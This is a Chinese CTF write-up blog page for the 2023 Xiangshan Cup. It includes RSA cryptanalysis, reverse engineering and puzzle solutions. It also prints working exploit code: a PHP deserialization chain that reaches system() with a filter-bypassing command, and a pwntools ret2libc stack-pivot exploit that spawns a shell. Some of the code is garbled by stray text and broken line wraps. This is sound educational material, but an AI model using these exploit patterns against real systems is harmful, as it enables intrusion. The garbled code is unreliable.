@@ -1,0 +1,692 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>香山杯-喵帕斯 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="香山杯 喵帕斯感谢明琦和yolo师傅  签到base64+凯撒   flag{we1c0m3_2_Ctf} list题目附件 import os import gmpy2 from Crypto.Util.number import * import random from secrets import flag def pad(s,l):     return s + os.urandom(l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="香山杯-喵帕斯">
+<meta property="og:url" content="http://w3nx1z1.github.io/posts/baecc4bd.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="香山杯 喵帕斯感谢明琦和yolo师傅  签到base64+凯撒   flag{we1c0m3_2_Ctf} list题目附件 import os import gmpy2 from Crypto.Util.number import * import random from secrets import flag def pad(s,l):     return s + os.urandom(l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2023-10-16T02:40:06.996Z">
+<meta property="article:modified_time" content="2025-02-14T08:30:17.452Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="w3nx1z1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/posts/baecc4bd.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '香山杯-喵帕斯',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-14 16:30:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">香山杯-喵帕斯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-16T02:40:06.996Z" title="发表于 2023-10-16 10:40:06">2023-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-14T08:30:17.452Z" title="更新于 2025-02-14 16:30:17">2025-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="香山杯-喵帕斯"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="香山杯-喵帕斯"><a href="#香山杯-喵帕斯" class="headerlink" title="香山杯 喵帕斯"></a>香山杯 喵帕斯</h1><p>感谢明琦和yolo师傅</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310180909578.png" alt="image-20231016102525193"></p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>base64+凯撒</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151929431.png" alt="image-20231015192934847"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151930321.png" alt="image-20231015193001284"></p>
+<p>flag{we1c0m3_2_Ctf}</p>
+<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>题目附件</p>
+<pre><code>import os
+import gmpy2
+from Crypto.Util.number import *
+import random
+from secrets import flag
+def pad(s,l):
+    return s + os.urandom(l - len(s))
+def gen():
+    g = getPrime(8)
+    while True:
+        p = g * random.getrandbits(138) + 1
+        if isPrime(p):
+            break
+    while True:
+        q = g * random.getrandbits(138) + 1
+        if isPrime(q):
+            break
+    N = p ** 5 * q
+    phi = p ** 4 * (p - 1) * (q - 1)
+    d = random.getrandbits(256)
+    e = inverse(d, phi)
+    E = e * g
+    hint = gmpy2.gcd(E, phi)
+    return N, E, hint
+
+flag = pad(flag,64)
+m = bytes_to_long(flag)
+n,e,hint = gen()
+c = pow(m,e,n)
+print(f&#39;hint = &#123;hint&#125;&#39;)
+print(f&#39;n = &#123;n&#125;&#39;)
+print(f&#39;e = &#123;e&#125;&#39;)
+print(f&#39;c = &#123;c&#125;&#39;)
+# hint = 251
+# n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
+# e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
+# c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162
+</code></pre>
+<p>首先要恢复 p，q.</p>
+<p>恢复p、q后就是在有限域内开高次方的问题。</p>
+<p>恢复p、q参考论文：<a target="_blank" rel="noopener" href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151931587.png" alt="image-20231015193103519"></p>
+<p>$e*d&#x3D;1\textbf{ }mod\textbf{ }phi,gcd(e,phi)&#x3D;1\Rightarrow$</p>
+<p>$e<em>x-1&#x3D;k</em>phi\Rightarrow$</p>
+<p>$因为n&#x3D;p^{r}<em>q,所以gcd(e</em>x-1,n)&#x3D;gcd(p^{r}<em>(p-1)</em>(q-1),p^{r}*q)&#x3D;p^{r}$</p>
+<p>在多项式时间内求解上面方程，用 <strong>small_roots()</strong> 就能恢复 <strong>p</strong></p>
+<p>exp</p>
+<pre><code>from gmpy2 import *
+N = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
+E = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
+c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162
+e = E//g
+
+PR.&lt;x&gt; = PolynomialRing(Zmod(N))
+f = e*x - 1
+res = f.monic().small_roots(X=2^256,beta=0.44)[0]
+p = iroot(gcd(int(f(res)),N),4)[0]
+q = N//p^5
+print(&#39;p,q=&#39;,p,q)
+
+# sage
+# 开251次方
+from Crypto.Util.number import *
+import itertools
+
+hint = 251
+n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
+e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
+c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162
+
+
+p,q=69367143733862710652791985332025152581988181 ,67842402383801764742069883032864699996366777
+
+p_list = [p,q]
+mi = [5, 1]
+
+# print(len(mi),len(p_list))
+n_list = [ZZ(p_list[i]) ** mi[i] for i in range(len(mi))]
+
+# print(n_list)
+# print(reduce((lambda x, y: x * y), n_list) - n)   # 0
+# print(euler_phi(p_list[0])) # 直接求欧拉函数
+
+res=[]
+
+for pi in n_list:
+    d = inverse(int(e//251),euler_phi(pi))     # 对n_listt 每一个 pi 求欧拉函数
+    m = pow(c,d,pi)                            # m = mm^108
+    res.append(Zmod(pi)(m).nth_root(251, all=True))   # nth_root # 最后一部分把 e 的公因数 108 去除之后用 sage 的 nth_root 直接开根即可，爆破大概7分钟。
+            # 在每一个pi环里 找到可以开108次方的放进result里面
+            # 在环里开108次方
+            # 会出来 9 个 list表 对应每个 pi
+for vc in itertools.product(*res):
+    _c = [int(x) for x in vc]
+    m = long_to_bytes(int(crt(_c, n_list)))
+    if b&quot;flag&quot; in m:
+        print(m)
+# b&#39;flag&#123;4b68c7eece6be865f6da2a4323edd491&#125;\x9d\xcf\xdc\xcb\xb8\xbdd\xec\xadh\xa6C\x99\xa0)7\xfb\x02\xba\x90q8\x10+\x7f&#125;&#39;
+</code></pre>
+<h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>源码</p>
+<pre><code class="php"> &lt;?php
+    error_reporting(0);
+    class Welcome&#123;
+        public $name;
+        public $arg = &#39;welcome&#39;;
+        public function __construct()&#123;
+            $this-&gt;name = &#39;Wh0 4m I?&#39;;
+        &#125;
+        public function __destruct()&#123;
+            if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;
+                echo $this-&gt;arg;
+            &#125;
+        &#125;
+    &#125;
+
+    class G00d&#123;
+        public $shell;
+        public $cmd;
+        public function __invoke()&#123;
+            $shell = $this-&gt;shell;
+            $cmd = $this-&gt;cmd;
+            if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $cmd))&#123;
+                die(&quot;U R A BAD GUY&quot;);
+            &#125;
+            eval($shell($cmd));
+        &#125;
+    &#125;
+
+    class H4ck3r&#123;
+        public $func;
+        public function __toString()&#123;
+            $function = $this-&gt;func;
+            $function();
+        &#125;
+    &#125;
+
+    if(isset($_GET[&#39;data&#39;]))
+        unserialize($_GET[&#39;data&#39;]);
+    else
+        highlight_file(__FILE__);
+?&gt; 
+</code></pre>
+<p>反序列化 最后记得绕过对<code>f1ag</code>的过滤 </p>
+<pre><code class="php">&lt;?php
+
+class Welcome
+&#123;
+    public $name;
+    public $arg=&#39;welcome&#39;;
+    public function __construct()&#123;
+        $this-&gt;name = &#39;Wh0 4m I?&#39;;
+    &#125;
+    public function __destruct()&#123;
+        if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;
+            echo $this-&gt;arg;
+        &#125;
+    &#125; 
+
+&#125;
+
+class G00d
+&#123;
+    public $shell;
+    public $cmd;
+
+&#125;
+class H4ck3r
+&#123;
+    public $func;
+    public function __toString()&#123;
+        $function = $this-&gt;func;
+        $function();
+    &#125; 
+&#125;
+
+$a = new Welcome();
+$a-&gt;name = &#39;A_G00d_H4ck3r&#39;;
+$a-&gt;arg = new H4ck3r();
+$a-&gt;arg-&gt;func = new G00d();
+$a-&gt;arg-&gt;func-&gt;shell = &#39;system&#39;;
+$a-&gt;arg-&gt;func-&gt;$cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;
+echo urlencode(serialize($a));xxxxxxxxxx &lt;?php&lt;?phpclass Welcome&#123;    public $name;    public $arg=&#39;welcome&#39;;    public function __construct()&#123;        $this-&gt;name = &#39;Wh0 4m I?&#39;;    &#125;    public function __destruct()&#123;        if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;            echo $this-&gt;arg;        &#125;    &#125; &#125;class G00d&#123;    public $shell;    public $cmd;&#125;class H4ck3r&#123;    public $func;    public function __toString()&#123;        $function = $this-&gt;func;        $function();    &#125; &#125;$a = new Welcome();$a-&gt;name = &#39;A_G00d_H4ck3r&#39;;$a-&gt;arg = new H4ck3r();$a-&gt;arg-&gt;func = new G00d();$a-&gt;arg-&gt;func-&gt;shell = &#39;system&#39;;$a-&gt;arg-&gt;func-&gt;$cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;echo urlencode(serialize($a));
+</code></pre>
+<h2 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h2><p>64 位小端序</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151940550.png" alt="image-20231015194046469"></p>
+<p>IDA 反编译</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151941050.png" alt="image-20231015194100001"></p>
+<p>再 bss 段输入 0x20 个字节，然后判断，成功则获得 0x10 个字节溢出</p>
+<p>1、利用 bss 段泄露 libc</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import *
+context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,os=&#39;linux&#39;)
+io = process(&#39;./pwn&#39;)
+pop_rdi_ret = 0x0000000000401353 #: pop rdi ; ret
+elf = ELF(&#39;./pwn&#39;)
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+main = elf.sym[&#39;main&#39;]
+shellcode = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+io.sendafter(&#39;lets travel again!\n&#39;,shellcode) #shellcode 刚 好 0x20 个 字 节 ， 所 以 不 能 使 用
+sendline，不然会产生回车多出了一个字节
+io.sendafter(&#39;Input your setp number&#39;,&#39;\x78\x56\x34\x12&#39;) #由于是小端序，所以 0x12345678 要
+反着写，也要使用 send，不能使用 sendline
+bss = 0x04050A0
+leave_ret = 0x040124B
+payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret) #劫持 ebp 为 bss 的前八个字节地址（因为两
+个 leave，ret 会往后跳 8 个字节）--跳转到 bss 执行 shell
+io.sendafter(&#39;TaiCooLa&#39;,payload) #也要使用 send，不能使用 sendline
+puts = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) #泄露 puts 函数的真实地址
+print(hex(puts))
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151941437.png" alt="image-20231015194158364"></p>
+<p>2、泄露 libc</p>
+<pre><code>libc = LibcSearcher(&#39;puts&#39;,puts)
+
+libc_base = puts - libc.dump(&#39;puts&#39;)
+
+system = libc_base + libc.dump(&#39;system&#39;)
+
+bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)
+</code></pre>
+<p>3、执行 shell</p>
+<pre><code>shellcode = p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main)
+
+io.sendafter(&#39;lets travel again!\n&#39;,shellcode)
+
+payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)
+
+io.interactive()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151942198.png" alt="image-20231015194223148"></p>
+<p>最终 exp</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import *
+context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,os=&#39;linux&#39;)
+io = process(&#39;./pwn&#39;)
+pop_rdi_ret = 0x0000000000401353 #: pop rdi ; ret
+elf = ELF(&#39;./pwn&#39;)
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+main = elf.sym[&#39;main&#39;]
+shellcode = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+io.sendafter(&#39;lets travel again!\n&#39;,shellcode)
+io.sendafter(&#39;Input your setp number&#39;,&#39;\x78\x56\x34\x12&#39;)
+bss = 0x04050A0
+leave_ret = 0x040124B
+payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)
+io.sendafter(&#39;TaiCooLa&#39;,payload)
+puts = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+print(hex(puts))
+libc = LibcSearcher(&#39;puts&#39;,puts)
+libc_base = puts - libc.dump(&#39;puts&#39;)
+system = libc_base + libc.dump(&#39;system&#39;)
+bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)
+shellcode = p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main)
+io.sendafter(&#39;lets travel again!\n&#39;,shellcode)
+payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)
+io.interactive()
+</code></pre>
+<h2 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151945358.png" alt="image-20231015194532321"></p>
+<p>拖到32位ida反编译后发现进行了写入文件的操作，下断点动调</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151945292.png" alt="image-20231015194546262"></p>
+<p>双击跟进 TempFlieName 找到文件名和路径 </p>
+<p>一直运行程序发现进行了 CloseHandle 和 DeleteFileA 的操作</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946083.png" alt="image-20231015194603036"></p>
+<p>重新动调，在 CloseHandle 操作前下断点然后去查看生成的临时tmp文件 </p>
+<p>因为开启第二次动调，发现每次生成文件的文件名都不同，这次是7379</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946840.png" alt="image-20231015194620797"></p>
+<p>用010打开发现文件头是PE的头</p>
+<p>改后缀为.exe后拖入ida分析</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946768.png" alt="image-20231015194637735"></p>
+<p>先是拿到一堆数据</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946567.png" alt="image-20231015194651522"></p>
+<p>发现进行了赋值到Block并进行了-30 的操作</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151947108.png" alt="image-20231015194702075"></p>
+<p>跟进一下sub_401110()函数</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151948703.png" alt="image-20231015194823672"></p>
+<p>简单分析一下走了一个base64解码</p>
+<pre><code class="python">import base64
+ cipher = [0x78,
+ 0x8B,
+ 0x96,
+ 0x86,
+ 0x78,
+ 0x51,
+ 0x91,
+ 0x50,
+ 0x6C,
+ 0x62,
+ 0x77,
+ 0x53,
+ 0x6C,
+ 0x88,
+ 0x63,
+ 0x50,
+ 0x78,
+ 0x71,
+ 0x4E,
+ 0x50,
+ 0x6B,
+ 0x98,
+ qui1t_p3n
+ qui1t_p3n
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+0x77,
+ 0x53,
+ 0x6A,
+ 0x72,
+ 0x77,
+ 0x97,
+ 0x6C,
+ 0x8B,
+ 0x77,
+ 0x92,
+ 0x6C,
+ 0x98,
+ 0x63,
+ 0x50,
+ 0x6D,
+ 0x71,
+ 0x4E,
+ 0x51,
+ 0x6C,
+ 0x62,
+ 0x77,
+ 0x96,
+ 0x6C,
+ 0x98,
+ 0x5F,0x50,
+ 0x6B,
+ 0x72,
+ 0x81,
+ 0x51,
+ 0x6C,
+ 0x88,
+ 0x64,
+ 0x57]
+ code = &quot;&quot;
+ for i in range(len(cipher)):
+    code += chr(cipher[i] - 30)
+ print(code)
+ print(base64.b64decode(code))
+ #输出结果：
+#ZmxhZ3s2NDY5NjE2ZS02MzY5LTYyNmYtNzE2OS03NDYxNzA2MTc3NjF9
+ #b&#39;flag&#123;6469616e-6369-626f-7169-746170617761&#125;’
+</code></pre>
+<h2 id="pintu"><a href="#pintu" class="headerlink" title="pintu"></a>pintu</h2><p>用montage和gaps搞了半天拼图 以为是二维码</p>
+<p>然后并不行 查看了几个图片的大小 发现宽度都是65  但是高度各不相同 </p>
+<p>写个脚本 分析这4703张图片的高度 并将相同高度的图片放到相同文件夹中</p>
+<pre><code class="python">import os
+from PIL import Image
+import shutil
+# 输入文件夹的路径
+input_folder = &quot;E:\Desktop/2023香山杯\misc\pintu_26914c79abf08a72af534387e23ffdf6\pintu&quot;
+
+# 创建一个字典，用于存储不同高度的图片列表
+height_to_images = &#123;&#125;
+
+# 遍历输入文件夹中的图片
+for filename in os.listdir(input_folder):
+    if filename.endswith(&quot;.jpg&quot;) or filename.endswith(&quot;.png&quot;):
+        file_path = os.path.join(input_folder, filename)
+
+        # 打开图片并获取其高度
+        with Image.open(file_path) as img:
+            height = img.height
+
+        # 如果高度不在字典中，则创建一个新列表
+        if height not in height_to_images:
+            height_to_images[height] = []
+
+        # 将图片添加到对应高度的列表中
+        height_to_images[height].append(filename)
+
+# 遍历字典，将同一高度的图片复制到对应的输出文件夹中
+for height, images in height_to_images.items():
+    # 创建输出文件夹
+    output_folder = os.path.join(&quot;output_folder&quot;, str(height))
+    os.makedirs(output_folder, exist_ok=True)
+
+    for image_filename in images:
+        input_path = os.path.join(input_folder, image_filename)
+        output_path = os.path.join(output_folder, image_filename)
+
+        # 复制图片
+        shutil.copy(input_path, output_path)
+
+print(&quot;图片分类完成&quot;)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152006808.png" alt="image-20231015200652767"></p>
+<p>再加上提示的<code>tip.jpg</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152011590.png" alt="image-20231015201119560"></p>
+<p>联想到8进制转10进制 再看高度也符合8进制的特点</p>
+<p>写个脚本将所有图片的高度提取出来</p>
+<pre><code class="python">import os
+from PIL import Image
+
+# 输入文件夹的路径
+input_folder = &quot;E:\Desktop\pintu\pintu&quot;
+
+# 创建一个空的文本文件用于写入高度数据
+output_file = &quot;E:\Desktop\pintu\pintu/height.txt&quot;
+
+# 获取文件夹中所有图片文件的列表
+image_files = [filename for filename in os.listdir(input_folder) if filename.endswith((&quot;.png&quot;))]
+
+# 打开文本文件以进行写入
+with open(output_file, &quot;w&quot;) as f:
+    # 遍历文件夹中的图片文件列表
+    for i in range(1, 4074):
+        filename = f&#39;&#123;i&#125;.png&#39;
+        img = Image.open(f&#39;&#123;input_folder&#125;/&#123;filename&#125;&#39;)
+        height = img.height
+
+        # 将高度写入文本文件，按顺序
+        f.write(f&quot;&#123;height&#125;&quot;+&quot; &quot;)
+
+print(&quot;高度数据已按顺序写入 height.txt 文件&quot;)
+</code></pre>
+<p>再将其转8进制 再将其转ascii码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152046241.png" alt="image-20231015204618175"></p>
